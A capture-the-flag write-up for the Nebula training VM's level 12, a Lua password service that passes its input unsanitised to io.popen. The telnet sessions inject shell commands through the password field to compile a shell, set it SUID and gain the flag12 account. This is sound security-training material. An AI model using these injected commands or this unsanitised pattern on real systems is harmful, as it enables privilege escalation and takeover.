**Intro**

A different scripting language, and a different hoop to jump through with the exploit occurring through a listening application, but the solution remains is still the same as that which plagues some of the other applications presented.  In this case, as with others, the script does no input validation and remote code execution is possible.

In the following line of code the script ingests any string sent to it as a password then attempts to create hash from the string.

```
prog = io.popen("echo "..password.." | sha1sum", "r")
```

By injecting a command with the password the remote system will execute the arbitrary code as shown

**Pre-Exploit**

```
﻿level12@nebula:/home/flag12$ ls -l
total 1
-rw-r--r-- 1 root root 685 2011-11-20 21:22 flag12.lua
```

**Exploit - Compile Code**

```
﻿level12@nebula:/home/flag12$ telnet localhost 50001
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: "";/usr/bin/cc -o /home/flag12/shell /tmp/shell.c
Better luck next time
Connection closed by foreign host.
```

**Exploit - Make Shell SUID**

```
﻿level12@nebula:/home/flag12$ telnet localhost 50001
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: "";/bin/chmod 4777 /home/flag12/shell
Better luck next time
Connection closed by foreign host.
```

**Exploit - New content***

```
level12@nebula:/home/flag12$ ls -la
total 14
drwxr-x--- 1 flag12 level12   60 2016-10-24 09:21 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
-rwsrwxrwx 1 flag12 flag12  7317 2016-10-24 09:21 shell
```

**Flag**

```
﻿level12@nebula:/home/flag12$ grep flag12 /etc/passwd
flag12:x:987:987::/home/flag12:/bin/sh
level12@nebula:/home/flag12$ ./shell 987
flag12@nebula:/home/flag12$ getflag
You have successfully executed getflag on a target account
```
